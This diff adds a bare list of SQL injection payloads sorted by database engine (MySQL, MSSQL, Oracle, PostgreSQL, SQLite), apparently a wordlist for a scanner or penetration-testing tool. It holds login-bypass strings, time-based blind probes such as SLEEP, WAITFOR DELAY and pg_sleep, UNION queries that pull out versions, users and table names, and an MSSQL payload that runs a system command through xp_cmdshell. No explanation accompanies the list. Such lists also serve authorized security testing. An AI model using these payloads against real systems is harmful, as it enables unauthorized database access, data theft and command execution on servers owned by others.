@@ -1,0 +1,56 @@
+MySQL SQL Injection Payloads:
+' OR '1'='1' --
+" OR "1"="1" --
+' AND SLEEP(5) --
+' UNION SELECT NULL, version() --
+' OR EXISTS(SELECT * FROM users) --
+' UNION SELECT database(), user(), version() --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' OR IF(1=1, SLEEP(3), 0) --
+' AND 1=1 --
+' AND 1=2 -- 
+MSSQL SQL Injection Payloads:
+' OR 1=1 --
+' OR 'abc'='abc' --
+' UNION SELECT NULL, NULL, NULL --
+'; WAITFOR DELAY '0:0:5' --
+'; IF (1=1) WAITFOR DELAY '0:0:5' --
+' UNION SELECT @@version, SYSTEM_USER --
+' AND ASCII(LOWER(SYSTEM_USER)) > 90 --
+'; EXEC xp_cmdshell 'whoami' --
+'; SELECT SYSTEM_USER --
+' AND SYSTEM_USER='sa' --
+Oracle SQL Injection Payloads:
+' OR '1'='1' -- 
+' UNION SELECT banner FROM v$version -- 
+'; BEGIN DBMS_LOCK.SLEEP(5); END; -- 
+'; SELECT * FROM dual WHERE 1=1 AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('x',5)) -- 
+' UNION SELECT user, sys_context('USERENV','SESSIONID') FROM dual -- 
+' AND 1=1 FROM dual -- 
+' AND ROWNUM=1 -- 
+' UNION SELECT NULL FROM DUAL -- 
+' AND EXISTS(SELECT * FROM DUAL) -- 
+' OR 1=1 FETCH FIRST 1 ROWS ONLY -- 
+PostgreSQL SQL Injection Payloads:
+' OR '1'='1' -- 
+' UNION SELECT NULL, NULL -- 
+'; SELECT pg_sleep(5); -- 
+' OR 1=1; SELECT pg_sleep(3); -- 
+' UNION SELECT version() -- 
+' UNION SELECT current_database(), current_user -- 
+' AND EXISTS(SELECT * FROM pg_user) -- 
+'; DO $$ BEGIN PERFORM pg_sleep(5); END $$; -- 
+' OR 1=CAST(1 AS INT) -- 
+' AND 1=CAST(1 AS INT) -- 
+SQLite SQL Injection Payloads:
+' OR 1=1 -- 
+' UNION SELECT sqlite_version(), NULL -- 
+' UNION SELECT name FROM sqlite_master WHERE type='table' -- 
+' AND EXISTS(SELECT name FROM sqlite_master WHERE type='table') -- 
+' OR 'a'='a -- 
+' UNION SELECT NULL,NULL -- 
+' AND 1=1 -- 
+' AND 1=2 -- 
+' UNION SELECT tbl_name FROM sqlite_master -- 
+' OR (SELECT COUNT(*) FROM sqlite_master) > 0 -- 
+
